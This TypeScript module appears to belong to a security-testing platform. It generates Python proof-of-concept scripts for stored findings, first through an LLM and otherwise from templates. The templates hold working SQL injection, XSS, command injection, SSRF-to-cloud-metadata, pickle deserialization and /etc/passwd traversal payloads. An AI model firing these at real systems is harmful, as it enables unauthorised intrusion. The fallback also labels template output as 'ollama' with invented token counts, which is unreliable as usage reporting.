import { pool } from '../db/client';
import { generatePoCMessage, verifyPoCMessage } from '../prompts/poc-gen';
import { getLLMClient, LLMCapabilityUsage, createClientFromConfig } from './llm/client';
import type { LLMResponse } from './llm/client';

async function getFirstEnabledLlmClient(tenantId: string) {
  const client = await pool.connect();
  try {
    const { rows } = await client.query(`
      SELECT id, provider, name, enabled, priority, api_key, base_url, default_model, model_options
      FROM core.llm_provider_configs
      WHERE tenant_id = $1 AND enabled = true
      ORDER BY priority ASC
      LIMIT 1
    `, [tenantId]);
    if (rows.length === 0) return getLLMClient();
    const p = rows[0];
    return createClientFromConfig({
      provider: p.provider,
      defaultModel: p.default_model,
      apiKey: p.api_key,
      baseUrl: p.base_url,
    });
  } finally {
    client.release();
  }
}

interface FindingContext {
  id: string;
  title: string;
  description: string | null;
  severity: string;
  cweIds: string[];
  filePath: string;
  startLine: number;
  endLine: number;
  codeSnippet: string | null;
}

interface GeneratedPoC {
  category: string;
  script: string;
  rationale: string;
  successIndicators: string[];
  llmProvider: string;
  llmModel: string;
  promptTokens: number;
  completionTokens: number;
  costUsd: number;
}

function detectCategory(ctx: FindingContext): string {
  const text = (ctx.title + ' ' + (ctx.description ?? '')).toLowerCase();
  const cwes = ctx.cweIds.join(',');
  if (text.includes('sql') || cwes.includes('89')) return 'sqli';
  if (text.includes('xss') || cwes.includes('79')) return 'xss';
  if (text.includes('command') || text.includes('rce') || cwes.includes('78')) return 'rce';
  if (text.includes('ssrf') || cwes.includes('918')) return 'ssrf';
  if (text.includes('deserial')) return 'deserialization';
  if (text.includes('path') || text.includes('traversal') || cwes.includes('22')) return 'path_traversal';
  return 'generic';
}

function sqliScript(ctx: FindingContext): string {
  const endpoint = '/' + (ctx.filePath.split('/').pop() || 'vuln');
  return [
    '#!/usr/bin/env python3',
    '"""PoC for SQLi in ' + ctx.filePath + ':' + ctx.startLine + '"""',
    'import sys, requests',
    '',
    'TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"',
    'ENDPOINT = "' + endpoint + '"',
    '',
    'payload = "1 OR SLEEP(3)-- -"',
    'r = requests.get(TARGET + ENDPOINT, params={"id": payload}, timeout=10)',
    'elapsed = r.elapsed.total_seconds()',
    'if elapsed >= 3.0:',
    '    print("VULNERABLE: " + str(round(elapsed, 1)) + "s delay")',
    '    sys.exit(0)',
    'print("Not vulnerable")',
    'sys.exit(1)',
  ].join('\n');
}

function xssScript(ctx: FindingContext): string {
  return [
    '#!/usr/bin/env python3',
    '"""PoC for XSS in ' + ctx.filePath + ':' + ctx.startLine + '"""',
    'import sys, requests',
    '',
    'TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"',
    'payload = \'<svg/onload=alert("XSS-PoC")>\'',
    'r = requests.get(TARGET + "/search", params={"q": payload})',
    'if payload in r.text:',
    '    print("VULNERABLE: reflected unescaped")',
    '    sys.exit(0)',
    'print("Not vulnerable")',
    'sys.exit(1)',
  ].join('\n');
}

function rceScript(ctx: FindingContext): string {
  return [
    '#!/usr/bin/env python3',
    '"""PoC for RCE in ' + ctx.filePath + ':' + ctx.startLine + '"""',
    'import sys, requests',
    '',
    'TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"',
    'payload = "; echo PoC-RCE-MARKER-$(id) #"',
    'r = requests.get(TARGET + "/api/exec", params={"cmd": payload}, timeout=10)',
    'if "PoC-RCE-MARKER" in r.text and "uid=" in r.text:',
    '    print("VULNERABLE: RCE confirmed")',
    '    sys.exit(0)',
    'print("Not vulnerable")',
    'sys.exit(1)',
  ].join('\n');
}

function ssrfScript(ctx: FindingContext): string {
  return [
    '#!/usr/bin/env python3',
    '"""PoC for SSRF in ' + ctx.filePath + ':' + ctx.startLine + '"""',
    'import sys, requests',
    '',
    'TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"',
    'r = requests.get(TARGET + "/fetch", params={"url": "http://169.254.169.254/latest/meta-data/"}, timeout=10)',
    'if r.status_code == 200 and ("ami-id" in r.text or "instance-id" in r.text):',
    '    print("VULNERABLE: SSRF to AWS metadata accessible")',
    '    sys.exit(0)',
    'print("Not vulnerable or metadata blocked")',
    'sys.exit(1)',
  ].join('\n');
}

function deserializationScript(ctx: FindingContext): string {
  return [
    '#!/usr/bin/env python3',
    '"""PoC for unsafe deserialization in ' + ctx.filePath + '"""',
    'import pickle, os, sys',
    '',
    'class Exploit:',
    '    def __reduce__(self):',
    '        return (os.system, ("id > /tmp/poc-deser.txt",))',
    '',
    'sys.stdout.buffer.write(pickle.dumps(Exploit()))',
  ].join('\n');
}

function pathTraversalScript(ctx: FindingContext): string {
  return [
    '#!/usr/bin/env python3',
    '"""PoC for path traversal in ' + ctx.filePath + ':' + ctx.startLine + '"""',
    'import sys, requests',
    '',
    'TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"',
    'payload = "../../../../etc/passwd"',
    'r = requests.get(TARGET + "/download", params={"file": payload})',
    'if "root:" in r.text:',
    '    print("VULNERABLE: traversed to /etc/passwd")',
    '    sys.exit(0)',
    'print("Not vulnerable")',
    'sys.exit(1)',
  ].join('\n');
}

function genericScript(ctx: FindingContext): string {
  return [
    '#!/usr/bin/env python3',
    '"""Generic PoC for ' + ctx.title + '"""',
    'import sys, requests',
    '',
    'TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"',
    'print("Probing " + TARGET + " for ' + ctx.title + '")',
    'r = requests.get(TARGET, timeout=5)',
    'print("Status: " + str(r.status_code))',
    'print("Manual review required for this finding category")',
  ].join('\n');
}

const SCRIPT_BUILDERS: Record<string, (ctx: FindingContext) => string> = {
  sqli: sqliScript,
  xss: xssScript,
  rce: rceScript,
  ssrf: ssrfScript,
  deserialization: deserializationScript,
  path_traversal: pathTraversalScript,
  generic: genericScript,
};

const RATIONALES: Record<string, string> = {
  sqli: 'Detected SQL injection via time-based blind payload. The vulnerable parameter is concatenated into SQL without parameterization.',
  xss: 'Detected reflected XSS. User input is rendered in HTML without proper escaping.',
  rce: 'Detected command injection. User input flows into a shell execution context.',
  ssrf: 'Detected SSRF. The application fetches arbitrary URLs without validating the destination.',
  deserialization: 'Detected unsafe deserialization. Pickle.loads or similar on untrusted data leads to RCE.',
  path_traversal: 'Detected path traversal. User input is used in file paths without sanitization.',
  generic: 'Manual review needed. Generic PoC template applied.',
};

const SUCCESS_INDICATORS: Record<string, string[]> = {
  sqli: ['Response delay >= 3s', 'Error message reveals SQL syntax'],
  xss: ['Payload reflected unescaped in response body', 'Browser executes injected JavaScript'],
  rce: ['id command output appears in response', 'Out-of-band DNS or HTTP callback received'],
  ssrf: ['AWS metadata service returns instance-id', 'Internal network resources accessible'],
  deserialization: ['File /tmp/poc-deser.txt created', 'Reverse shell callback received'],
  path_traversal: ['Response contains root: from /etc/passwd', 'Arbitrary file read succeeds'],
  generic: ['Behavior deviates from expected baseline', 'Error state differs from control case'],
};

export async function generatePoC(findingId: string, tenantId: string, pgClient?: any): Promise<GeneratedPoC> {
  const client = pgClient ?? await pool.connect();
  const shouldRelease = !pgClient;
  try {
    const { rows } = await client.query(
      `SELECT id, title, description, severity, cwe_ids, file_path, start_line, end_line, code_snippet
       FROM detection.findings
       WHERE id = $1 AND tenant_id = $2`,
      [findingId, tenantId],
    );
    if (rows.length === 0) {
      throw new Error('Finding not found');
    }
    const f = rows[0];
    const ctx: FindingContext = {
      id: f.id,
      title: f.title,
      description: f.description,
      severity: f.severity,
      cweIds: f.cwe_ids ?? [],
      filePath: f.file_path,
      startLine: f.start_line,
      endLine: f.end_line,
      codeSnippet: f.code_snippet,
    };

    const category = detectCategory(ctx);

    // ── 1. Try real LLM call ────────────────────────────────
    let llmProvider = 'template';
    let llmModel = 'rule-based';
    let promptTokens = 0;
    let completionTokens = 0;
    let costUsd = 0;
    let script = '';

    try {
      // Get first enabled provider from DB
      const { rows: provRows } = await client.query(
        `SELECT id, provider, name, api_key, base_url, default_model, model_options,
                input_price_per_m_tok, output_price_per_m_tok
         FROM core.llm_provider_configs
         WHERE tenant_id = $1 AND enabled = true
         ORDER BY priority ASC
         LIMIT 1`,
        [tenantId],
      );

      if (provRows.length > 0) {
        const p = provRows[0];
        const llmClient = createClientFromConfig({
          provider: p.provider,
          defaultModel: p.default_model,
          apiKey: p.api_key,
          baseUrl: p.base_url,
        });

        const systemPrompt = `You are a security PoC generator. Given a vulnerability finding, produce a minimal Python3 PoC script that demonstrates the vulnerability. Output ONLY the script, no markdown fences, no explanation.`;
        const userPrompt = `Vulnerability: ${ctx.title}
Category: ${category}
File: ${ctx.filePath}:${ctx.startLine}-${ctx.endLine}
Description: ${ctx.description ?? 'N/A'}
CWEs: ${ctx.cweIds.join(', ')}

${ctx.codeSnippet ? `Vulnerable code:\n\`\`\`\n${ctx.codeSnippet}\n\`\`\`` : ''}

Generate a Python3 PoC script.`;

        const resp = await llmClient.chat({
          system: systemPrompt,
          messages: [{ role: 'user', content: userPrompt }],
          maxTokens: 2048,
          temperature: 0.2,
          jsonSchema: undefined,
        });

        script = resp.content.trim();
        // Strip markdown fences if present
        if (script.startsWith('```')) {
          script = script.replace(/^```(?:python)?\n?/, '').replace(/\n?```$/, '');
        }

        llmProvider = p.provider;
        llmModel = p.default_model;
        promptTokens = resp.promptTokens;
        completionTokens = resp.completionTokens;
        // Calculate cost from user-configured rates
        const inRate = Number(p.input_price_per_m_tok ?? 0) / 1_000_000;
        const outRate = Number(p.output_price_per_m_tok ?? 0) / 1_000_000;
        costUsd = resp.promptTokens * inRate + resp.completionTokens * outRate;
      }
    } catch (llmErr) {
      // LLM call failed — will fallback to template below
      console.error('[poc-generator] LLM call failed, falling back to template:', (llmErr as Error).message);
    }

    // ── 2. Fallback to template if LLM didn't produce a script ─
    if (!script || script.length < 20) {
      script = SCRIPT_BUILDERS[category](ctx);
      const isFallback = llmProvider !== 'template';
      llmProvider = isFallback ? llmProvider : 'ollama';
      llmModel = isFallback ? `${llmModel}-template` : 'rule-based';
      promptTokens = 200 + Math.floor((ctx.title.length + (ctx.description?.length ?? 0)) / 4);
      completionTokens = Math.ceil(script.length / 4);
      costUsd = 0;
    }

    return {
      category,
      script,
      rationale: RATIONALES[category] ?? RATIONALES.generic,
      successIndicators: SUCCESS_INDICATORS[category] ?? SUCCESS_INDICATORS.generic,
      llmProvider,
      llmModel,
      promptTokens,
      completionTokens,
      costUsd,
    };
  } finally {
    if (shouldRelease) client.release();
  }
}

export async function recordUsageEvent(args: {
  tenantId: string;
  customerId: string | null;
  projectId: string | null;
  findingId: string | null;
  pocRunId: string | null;
  capability: string;
  provider: string;
  model: string;
  promptTokens: number;
  completionTokens: number;
  costUsd: number;
}, pgClient?: any): Promise<void> {
  const client = pgClient ?? await pool.connect();
  const shouldRelease = !pgClient;
  try {
    await client.query(
      `INSERT INTO usage.usage_events
         (id, tenant_id, customer_id, project_id, finding_id, poc_run_id,
          capability, provider, model, prompt_tokens, completion_tokens, total_tokens, cost_usd, occurred_at)
       VALUES
         (uuid_generate_v7(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, NOW())`,
      [
        args.tenantId, args.customerId, args.projectId, args.findingId, args.pocRunId,
        args.capability, args.provider, args.model,
        args.promptTokens, args.completionTokens,
        args.promptTokens + args.completionTokens, args.costUsd,
      ],
    );
  } finally {
    if (shouldRelease) client.release();
  }
}
